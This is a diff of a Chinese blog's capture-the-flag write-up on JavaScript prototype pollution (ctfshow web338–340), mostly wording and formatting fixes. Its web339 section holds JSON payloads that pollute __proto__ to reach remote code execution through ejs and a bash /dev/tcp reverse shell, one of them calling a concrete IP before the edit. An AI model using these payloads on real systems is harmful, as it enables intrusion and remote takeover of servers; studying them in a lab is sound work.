@@ -485,7 +485,7 @@ JavaScript中，我们如果要定义一个类，需要以">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-25
+                    2022-05-19
                 </div>
                 
 
@@ -533,13 +533,13 @@ JavaScript中，我们如果要定义一个类，需要以">
 <p>这里test()函数的内容其实就是test类的构造函数</p>
 <p>而<strong>constructor</strong>这个属性就是用于查看对象的构造函数</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p>
-<p>接下来我们要知道<strong>prototype</strong>和**<em>_proto</em>_**又是什么</p>
+<p>接下来我们要知道<strong>prototype</strong>和**__proto__**又是什么</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103557261-114570044.png" alt="img"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103622089-1134417169.png" alt="img"></p>
 <p>从类的角度讲，<code>prototype</code>是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有<code>__proto__</code>出现，且一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性。</p>
 <p>这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。</p>
 <p>对于a而言有个__proto__属性指向window.Object.prototype</p>
-<p>这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.<em>_<em>proro</em></em>_ 上面去找 toString。</p>
+<p>这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.__proro__ 上面去找 toString。</p>
 <p>所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p>
 <p>对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show()</p>
@@ -552,7 +552,7 @@ JavaScript中，我们如果要定义一个类，需要以">
 </ol>
 <h2 id="JavaScript的原型与原型链"><a href="#JavaScript的原型与原型链" class="headerlink" title="JavaScript的原型与原型链"></a>JavaScript的原型与原型链</h2><p>这种继承机制使得JavaScript中有原型和原型链的存在</p>
 <p><strong>原型</strong></p>
-<p>①所有<code>引用类型</code>都有一个<code>__proto__(隐式原型)</code>属性，属性值是一个普通的对象<br>②所有<code>函数</code>都有一个<code>prototype(原型)</code>属性，属性值是一个普通的对象<br>③所有<code>引用类型的__proto__</code>属性<code>指向</code>它<code>构造函数的prototype</code>**</p>
+<p>①所有<code>引用类型</code>都有一个<code>__proto__(隐式原型)</code>属性，属性值是一个普通的对象<br>②所有<code>函数</code>都有一个<code>prototype(原型)</code>属性，属性值是一个普通的对象<br>③所有<code>引用类型的__proto__</code>属性<code>指向</code>它<code>构造函数的prototype</code></p>
 <p><strong>原型链</strong></p>
 <p>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160322110905589-2039017350.png" alt="什么是原型链？"></p>
@@ -725,12 +725,12 @@ module.exports &#x3D; router;</code></pre>
 <p>看login.js</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p>
 <p>让secert的ctfshow属性等于36dboy</p>
-<p>{&quot;<em>_proto</em>_&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p>
+<p>{&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p>
 <p>抓包之后改一下</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p>
 <h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p><strong>非预期解：</strong>利用ejs模板rce漏洞</p>
 <p>羽师傅的payload：</p>
-<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre>
+<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre>
 
 <p>反弹之前可以先关一下服务器的防火墙systemctl stop firewalld</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p>
@@ -745,15 +745,17 @@ module.exports &#x3D; router;</code></pre>
 <p>这里要求ctfshow=flag的内容，可我们并不知道flag</p>
 <p>我们再看看api.js</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171015673.png" alt="image-20220222171015673"></p>
+<p>Function里的query变量没有被引用</p>
 <p>如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作</p>
 <p>但是这个是变量不是变量的属性，也能污染吗</p>
 <p>答案是可以的</p>
 <pre class="language-none"><code class="language-none">因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在</code></pre>
 
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222173051138.png" alt="image-20220222173051138"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220519170152098.png" alt="image-20220519170152098"></p>
 <p>所以我们可以构造payload</p>
 <pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre>
 
+<p>在login页面post一下进行污染</p>
 <p>然后访问一下api页面触发query</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p>
 <h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>登录部分</p>
@@ -1597,7 +1599,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">149.6k</span>
+                        class="white-color">159.9k</span>
             
             
             
